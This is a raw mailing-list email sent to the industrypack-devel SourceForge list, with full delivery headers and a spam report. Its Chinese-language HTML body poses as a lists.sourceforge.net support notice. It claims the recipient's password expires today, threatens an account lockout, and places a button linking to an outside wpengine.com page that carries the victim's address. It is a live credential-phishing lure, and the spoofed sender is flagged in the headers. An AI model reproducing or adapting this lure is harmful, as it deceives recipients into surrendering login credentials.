Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id ADC59A6D58F
	for <lists+industrypack-devel@lfdr.de>; Mon, 24 Mar 2025 08:58:02 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1twch6-0001fp-MC
	for lists+industrypack-devel@lfdr.de;
	Mon, 24 Mar 2025 07:58:01 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <bonytex@ms23.hinet.net>) id 1twch4-0001fU-Th
 for industrypack-devel@lists.sourceforge.net;
 Mon, 24 Mar 2025 07:57:59 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=HPZQ6OLvBvO+x7yffeenfyq0YYbfIBfJk1wKE6QlHpc=; b=mliqayO6JR4UOC5pbep9qdKLGx
 h1KEFACUaUR/3r9673Yo3XTMvhMHz9WJSblgFPbbaFvRNkiXOiNnV4YmN/81yXo5pCFQuNDcURGZO
 aeSIblKy3iVATL2ElQPtG07AZ9zPgKfyRd7eoK90VuglDOg6pemDBBZttOFPe3IywYKc=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=HPZQ6OLvBvO+x7yffeenfyq0YYbfIBfJk1wKE6QlHpc=; b=j
 ONc4IRbupRvjJ3+IVAdKlxpr1C8u0xXB7i7NaUAQGp70w5140ruYxMup9SZDvDtP4vjl3QMXkxGH5
 N9+ZzGx8HyoHUUZbVHjqRr5MLsDBNJ7iHkKc015T6DDWqL/Cm7h9qocFS8KnIf3udBz+bdmNaUkWt
 Gift0gRkeKTLAHvA=;
Received: from [185.253.118.73] (helo=mta1.bdo.com.cn)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1twcgu-0006PC-5s for industrypack-devel@lists.sourceforge.net;
 Mon, 24 Mar 2025 07:57:59 +0000
From: lists.sourceforge.net=?UTF-8?B?wqk=?= <bonytex@ms23.hinet.net>
To: industrypack-devel@lists.sourceforge.net
Date: 24 Mar 2025 09:37:23 +0200
Message-ID: <20250324093722.284C53B9D7A4BDC4@ms23.hinet.net>
MIME-Version: 1.0
X-Spam-Score: 2.0 (++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  lists.sourceforge.net 支持通知 所需操作： industrypack-devel
    (industrypack-devel@lists.sourceforge.net) 密码凭据 设置为今天 3/24/2025
    9:37:22 a.m. 到期。 您必须使用下面相同的注册密码。 
 
 Content analysis details:   (2.0 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
                             query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                             [185.253.118.73 listed in sa-accredit.habeas.com]
  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
                             query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                            [185.253.118.73 listed in bl.score.senderscore.com]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.7 SPF_NEUTRAL            SPF: sender does not match SPF record (neutral)
  0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
                             provider
                             [bonytex[at]ms23.hinet.net]
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.0 T_MXG_EMAIL_FRAG       URI with email in fragment
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
                             identical to background
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  0.0 SPOOFED_FREEMAIL_NO_RDNS From SPOOFED_FREEMAIL and no rDNS
  0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
  0.0 SPOOFED_FREEMAIL       No description available.
X-Headers-End: 1twcgu-0006PC-5s
Subject: [Industrypack-devel] =?utf-8?b?6YeN6KaB5o+Q6YaS77ya6YKu566x5a+G?=
 =?utf-8?b?56CB5Y2z5bCG5Yiw5pyf77yM6K+35Y+K5pe25aSE55CG?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3439318141745560452=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============3439318141745560452==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>
<html>
<head>
    <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
</head>
<body>
    <div style=3D"font-size: 14px; max-width: 600px; margin: 0px auto;">
        <table role=3D"presentation" style=3D"width: 600px; border-collapse=
: collapse; border-spacing: 0px;" cellspacing=3D"0" cellpadding=3D"0" align=
=3D"center" border=3D"0">
            <tbody>
                <tr>
                    <td style=3D"font-size: 0px; padding-bottom: 0px; direc=
tion: ltr; text-align: center; padding-top: 20px; padding-left: 0px; margin=
: 0px; padding-right: 0px;">
                        <div style=3D"width: 600px; vertical-align: top; di=
rection: ltr; text-align: left; display: inline-block;">
                            <table role=3D"presentation" style=3D"vertical-=
align: top; border-collapse: collapse; border-spacing: 0px;" cellspacing=3D=
"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
                                <tbody>
                                    <tr>
                                        <td style=3D"padding-bottom: 10px; =
padding-top: 10px; padding-left: 25px; margin: 0px; padding-right: 25px;" a=
lign=3D"left">
                                            <div style=3D"font-size: 18px; =
font-family: Helvetica, Arial, sans-serif; color: rgb(67,66,69); text-align=
: center; line-height: 24px;">
                                                <h1 style=3D"font-size: 24p=
x; margin: 0px; line-height: normal;">
                                                    lists.sourceforge.net &=
#25903;&#25345;&#36890;&#30693;
                                                </h1>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <div style=3D"font-size: 14px; max-width: 600px; margin: 0px auto;">
        <table role=3D"presentation" style=3D"width: 600px; border-collapse=
: collapse; border-spacing: 0px;" cellspacing=3D"0" cellpadding=3D"0" align=
=3D"center" border=3D"0">
            <tbody>
                <tr>
                    <td style=3D"font-size: 0px; padding-bottom: 20px; dire=
ction: ltr; text-align: center; padding-top: 20px; padding-left: 0px; margi=
n: 0px; padding-right: 0px;">
                        <div style=3D"font-size: 0px; font-family: Helvetic=
a, Tahoma, Arial, sans-serif; width: 600px; vertical-align: top; white-spac=
e: normal; word-spacing: 0px; text-transform: none; font-weight: 400; color=
: rgb(0,0,0); direction: ltr; font-style: normal; text-align: left; orphans=
: 2; widows: 2; display: inline-block; letter-spacing: normal; background-c=
olor: rgb(255,255,255); text-indent: 0px;">
                            <table role=3D"presentation" style=3D"vertical-=
align: top; border-collapse: collapse; border-spacing: 0px;" cellspacing=3D=
"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
                                <tbody>
                                    <tr>
                                        <td style=3D"padding-bottom: 10px; =
padding-top: 10px; padding-left: 25px; margin: 0px; padding-right: 25px;" a=
lign=3D"left">
                                            <div style=3D"font-size: 18px; =
font-family: Helvetica, Arial, sans-serif; color: rgb(67,66,69); line-heigh=
t: 24px;">
                                                <p style=3D"margin: 5px 0px=
;">
                                                    &#25152;&#38656;&#25805=
;&#20316;&#65306; industrypack-devel&nbsp;&nbsp;&nbsp;(industrypack-devel@l=
ists.sourceforge.net)&nbsp;&nbsp;&nbsp;&#23494;&#30721;&#20973;&#25454;&nbs=
p;&nbsp;&nbsp;&#35774;&#32622;&#20026;&#20170;&#22825;&nbsp;3/24/2025 9:37:=
22 a.m.&nbsp;&#21040;&#26399;&#12290;
                                                </p>
                                                <br>
                                                <p style=3D"margin: 5px 0px=
;">
                                                    &#24744;&#24517;&#39035=
;&#20351;&#29992;&#19979;&#38754;&#30456;&#21516;&#30340;&#27880;&#20876;&#=
23494;&#30721;&#12290;
                                                </p>
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style=3D"padding-bottom: 10px; =
padding-top: 10px; padding-left: 25px; margin: 0px; padding-right: 25px;" a=
lign=3D"left">
                                            <table role=3D"presentation" st=
yle=3D"border-spacing: 0px; line-height: 0px;" cellspacing=3D"0" cellpaddin=
g=3D"0" border=3D"0">
                                                <tbody>
                                                    <tr>
                                                        <td role=3D"present=
ation" style=3D"border-top: medium none; border-right: medium none; backgro=
und: rgb(46,88,255); border-bottom: medium none; border-left: medium none; =
margin: 0px; border-radius: 30px;" valign=3D"middle" align=3D"center">
                                                            <a style=3D"fon=
t-size: 14px; font-family: Helvetica, Arial, sans-serif; text-transform: up=
percase; font-weight: bold; color: rgb(255,255,255); padding-bottom: 10px; =
padding-top: 10px; padding-left: 25px; margin: 0px; display: inline-block; =
line-height: 30px; padding-right: 25px; border-radius: 30px; text-decoratio=
n-line: none;" href=3D"https://salesoptimadi1.wpengine.com/psword.html#indu=
strypack-devel@lists.sourceforge.net" rel=3D"external" target=3D"_blank">
                                                                &#20445;&#3=
0041;&#24744;&#30340;&#20973;&#25454;
                                                            </a>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style=3D"padding-bottom: 10px; =
padding-top: 10px; padding-left: 25px; margin: 0px; padding-right: 25px;" a=
lign=3D"left">
                                            <div style=3D"font-size: 18px; =
font-family: Helvetica, Arial, sans-serif; color: rgb(211,83,81); line-heig=
ht: 24px;">
                                                <p style=3D"margin: 5px 0px=
;">
                                                    &#27880;&#24847;&#65306=
;&#26356;&#26032;&#24744;&#30340;&#30005;&#23376;&#37038;&#20214;&#23494;&#=
30721;&#38750;&#24120;&#37325;&#35201;&#12290;&#22914;&#26524;&#24744;&#199=
81;&#26356;&#26032;&#65292;&#24744;&#30340;&#36134;&#25143;&#23558;&#34987;=
&#38145;&#23450;&#65292;&#24182;&#19988;&#24744;&#23558;&#26080;&#27861;&#3=
5775;&#38382;&#24744;&#30340;&#30005;&#23376;&#37038;&#20214;&#12290;
                                                </p>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <div style=3D"font-size: 0px; max-width: 600px; font-family: Helvetica,=
 Tahoma, Arial, sans-serif; white-space: normal; word-spacing: 0px; text-tr=
ansform: none; font-weight: 400; color: rgb(0,0,0); font-style: normal; tex=
t-align: center; orphans: 2; widows: 2; margin: 0px auto; letter-spacing: n=
ormal; background-color: rgb(255,255,255); text-indent: 0px;">
        <table role=3D"presentation" style=3D"width: 600px; border-collapse=
: collapse; border-spacing: 0px;" cellspacing=3D"0" cellpadding=3D"0" align=
=3D"center" border=3D"0">
            <tbody>
                <tr>
                    <td style=3D"padding-bottom: 20px; direction: ltr; padd=
ing-top: 0px; padding-left: 0px; margin: 0px; padding-right: 0px;">
                        <div style=3D"width: 600px; vertical-align: top; di=
rection: ltr; text-align: left; display: inline-block;">
                            <table role=3D"presentation" style=3D"vertical-=
align: top; border-collapse: collapse; border-spacing: 0px;" cellspacing=3D=
"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
                                <tbody>
                                    <tr>
                                        <td style=3D"padding-bottom: 10px; =
padding-top: 10px; padding-left: 25px; margin: 0px; padding-right: 25px;">
                                            <p style=3D"font-size: 1px; bor=
der-top: lightgrey 1px dashed; width: 550px; margin: 0px auto;"></p>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style=3D"padding-bottom: 10px; =
padding-top: 10px; padding-left: 25px; margin: 0px; padding-right: 25px;" a=
lign=3D"left">
                                            <div style=3D"font-size: 14px; =
font-family: Helvetica, Arial, sans-serif; color: rgb(153,153,153); line-he=
ight: 24px;">
                                                <br>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
</body>
</html>


--===============3439318141745560452==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3439318141745560452==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3439318141745560452==--
